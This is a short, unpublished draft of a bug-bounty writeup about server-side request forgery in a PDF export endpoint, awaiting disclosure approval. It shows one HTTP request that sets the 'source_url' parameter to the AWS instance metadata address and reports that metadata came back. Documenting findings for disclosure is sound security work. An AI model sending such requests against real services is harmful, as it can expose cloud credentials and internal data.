---
layout: post
title: "SSRF via PDF Export Feature — Draft"
date: 2026-04-06
tag: writeup
visibility: private
description: "Server-Side Request Forgery through a PDF generation endpoint. Still drafting — checking disclosure rules."
topics:
  - ssrf
  - writeup
likes: 0
---

## Draft — Not Yet Published

This post is still being written. It will be published once I confirm the program's disclosure policy allows it.

---

## Overview

Found an SSRF in a PDF export feature. The endpoint accepted arbitrary URLs as the "source" parameter for the PDF generator. Classic case.

## The Finding

```
POST /api/export/pdf HTTP/1.1
Content-Type: application/json

{
  "source_url": "http://169.254.169.254/latest/meta-data/"
}
```

Response included AWS metadata. Not great.

## More notes here...

Still writing this up properly. Need to:
- [ ] Get disclosure approval
- [ ] Clean up the PoC
- [ ] Add timeline table
- [ ] Check if full SSRF or blind
